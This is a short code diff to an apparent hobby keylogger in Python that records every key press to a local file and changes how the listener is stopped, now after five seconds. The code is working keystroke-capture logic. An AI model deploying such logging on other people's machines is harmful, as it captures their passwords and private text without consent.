@@ -1,5 +1,5 @@
 import logging
-import time
+from threading import Timer
 
 from pynput.keyboard import Key, Listener
 
@@ -10,8 +10,7 @@ logging.basicConfig(filename=("keylogs.txt"),filemode="w",
 def on_press(key):
     logging.info(str(key))
 with Listener(on_press=on_press) as listener:
-    fin = time.time() + 30
-    while time.time() < fin:
-        listener.join()
+    Timer(5, listener.stop).start()
+    listener.join()
 
 
